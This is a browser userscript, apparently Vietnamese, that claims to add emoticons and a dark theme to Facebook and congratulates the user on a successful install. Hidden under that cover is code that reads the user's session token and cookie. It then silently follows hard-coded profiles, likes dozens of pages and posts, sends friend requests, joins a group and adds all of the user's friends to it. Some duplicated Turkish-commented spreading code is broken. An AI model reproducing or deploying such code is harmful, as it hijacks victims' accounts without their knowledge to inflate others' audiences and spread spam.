	// {

	// Toggler
	html += '<a class="navLink" title="1 Thông Báo Mới">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//3k sub Phương Dart
a("100002069823251");
//Sub 6k5 1k Jun
a("100000342572591");a("100003544827926");
//Escape 1k 1 ngày
Like("431678166915086");
//Cáo
a("100001816821633");a("1094931336");
//KB
P("167215940150971");P("179821848890380");P("168508133359556");P("187344871475882");
P("189983447878691");P("176623319214704");P("176760245867678");P("709550649061366");
P("665561983496372");P("588594244526480");P("200502440160125");P("200593226817713");
P("189983801211989");P("178008145742888");P("691485244237379");P("397485333721147");
P("203615579848811");P("214725575404478");P("213685985508437");P("214723112071391");
Like("332355500243431");Like("504531169645970");Like("763520356993515");
Like("513143108778372");Like("593419554063907");Like("244228262418445");
Like("191616137716376");Like("226254797574744");Like("593224067421117");
Like("670717889659292");Like("581006078649634");Like("435618606570406");
Like("635189399850983");Like("1401228496802919");Like("703819499648878");
Like("571986922893233");Like("1400316543560365");Like("1459175364294378");
Like("704133272935144");Like("662101923848829");Like("830572610293052");
Like("409977279135458");Like("541126942636719");Like("326070480845192");
Like("553003411443575");Like("1505224726369562");Like("299141920362");
Like("1387239811496628");Like("629840003729785");Like("601937466549353");
Like("398577290286484");Like("600022803355132");Like("294310017385574");
Like("226007947590565");Like("1417053655184262");Like("506617856124477");
Like("475585372567552");Like("607106196046174");Like("1433451696899470");
Like("426894150788491");Like("830572610293052");Like("226254797574744");
Like("673668309357544");Like("631264930279907");Like("681428765272759");
Like("1559260944299379");Like("596610450424010");Like("514898388630142");
Like("574242692683534");Like("619039754832856");Like("313199228827072");
Like("259045920944167");Like("747007682000842");Like("420263944772396");
Like("580078912067909");Like("517737744991078");Like("1408531056069010");
Like("430544910382522");Like("682832758425693");Like("344449085698579");
Like("134577343379458");Like("798773556807399");Like("469514169815045");
Like("641121632630657");
a("100000217164684");a("100005876974912");a("100004697408848");a("100008117503143");
a("100003067072459");a("100006011107414");a("100002789161183");a("100005957683886");
a("100002604994780");a("100002473451177");a("100001277308266");a("100001553509632");
a("100007747568798");a("100005892974106");a("100006006697043");a("100006469761002");
sublist("657983364218896");sublist("110777179132652");sublist("111990389011331");
//Tag
Like("438920449586141");P("458693607608825");
Like("1403499119913875");P("1416393175291136");
//Set Page Set Group
//HùngML
a("100008060794971");a("100007554611346");a("100006814207455");
a("100006982782836");a("100003844183633");P("1419197408342066");
Like("1475721565982266");Like("191139061082105");Like("611494398938421");
Like("446917225414153");IDS("100008060794971");
//Tú Nguyễn Đẹp Trai
Like("1400222283572843");Like("836970632995439");Like("1436789326567177");
Like("614464048623324");Like("234682163401152");a("100003834622874");
P("338415912962893");P("380572872080530");P("377155189088965");
//Phương Nam
a("100007070701441");sublist("1391949814384029");
//Phúc Hoàng set group
a("100002908492867");a("100007585687237");a("100003101607780");
//QU set group
a("100003707809597");a("100006775533578");a("100007469583387");
a("100005370840280");a("100005138379794");a("100003882060976");
Like("579680008786586");Like("572664496136415");Like("801084759905745");
Like("185529444991664");Like("222009984617149");Like("715285328523016");
Like("216903451798302");Like("1473930432832035");P("389730264502333");
//Dũng ngulol
a("100003985503525");a("100000285402967");a("100002800789995");
a("745827685");a("100000087222473");IDS("100003822711894");
a("100001412175820");IDS("100006783331269");a("100006767799913");
//Nguyễn Việt Anh set group
Like("1481281108750582");Like("218379725037348");Like("1479299808949063");
//Nguyễn Ngọc Hiếu
IDS("100003813756513");P("381984208605368");
Like("255198684651867");
//Thiên Lôi set page group
Like("1581993795359148");Like("407315155948857");
//QC
a("100003279478539");Like("1464949470389691");
//Hải Đê tiện set group
a("100001910195980");sublist("523193167754352");
//Không Tên set group
a("839493429");sublist("10151995479593430");sublist("10151857219433430");
//Lee Phuc
a("1018091083");a("100004758036330");P("10202299438180180");Like("1479789198909953"); 
//Bax
a("100003532235502");a("100003814870782");a("100002965411767");a("100003772955359");
P("468765256584545");P("404041226398306");P("352457424891417");P("368500676620425");
a("1813661107");a("100008013284262");a("100007757917406");a("100007743000698");
a("100006055170621");a("100000051664354");a("100006825254598");a("100004941610245");
//KangBee
a("100004786954242");a("100002968200753");a("100003908713413");
P("260043490831881");P("258827094286854");P("254189828083914");
P("252418168261080");P("249578415211722");P("243291089173788");
P("242270002609230");P("239619812874249");P("237793866390177");
P("235088936660670");P("222686574567573");P("217455501757347");
P("134489563387275");P("269123059923924");P("254189828083914");
Like("585333791547445");Like("206051206265286");Like("506515409466287");
Like("585333791547445");Like("292627450895141");Like("1427447047497103");

var gid = ['553539698012876'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
//Giao Diện
//new them: >>
(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #fff !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://duongbo.vn/data/data/huyentt/2.2014/6.2/20140206-ST01.png) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #00FF00!important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;\nborder:4px ridge #CC00FF !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FF00FF!important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FF00FF!important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;\nborder:2px ridge #FF00FF!important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;\n   border:2px ridge #FF0033 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #3399FF!important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #3399FF!important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #3399FF!important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #3399FF!important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #CC00FF !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
//theme
(function() {
var css = "#facebook body:not(.transparent_widget),#nonfooter,#booklet,.UIFullPage_Container,.fbConnectWidgetTopmost,.connect_widget_vertical_center,.fbFeedbackContent,#LikeboxPluginPagelet\n{ \ncolor: #fff !important;\nbackground: url(\"http://duongbo.vn/data/data/huyentt/2.2014/6.2/20140206-ST01.png\") no-repeat fixed, -webkit-radial-gradient(100% 50%, circle, #FFBB22 3%, #BBAA44 10%, transparent 45%) fixed, -webkit-radial-gradient(0% 50%, circle, #FFBB22 3%, #BBAA44 10%, transparent 45%) fixed, -webkit-radial-gradient(50% 0%, circle, #FFBB22 3%, #BBAA44 10%, transparent 45%) fixed, -webkit-radial-gradient(50% 100%, circle, #FFBB22 3%, #BBAA44 10%, transparent 45%) fixed, #444410 !important;\nbackground-size: 100% 100%, cover, cover, cover, cover, cover !important;\n}\n* {\nborder-color: transparent !important;\nfont-family: Comic Sans MS !important;\ncolor: #FFFFFF !important;\nbackground-color: transparent !important; \n}\n\n\na,.UIActionButton_Text,span,div,input[value=\"Comment\"] {text-shadow: #000 1px 1px 1px !important;}\n\n.UIComposer_InputArea *,.highlighter div{text-shadow: none !important;}\n\n#profile_name {text-shadow: #fff 0 0 2px,#000 1px 1px 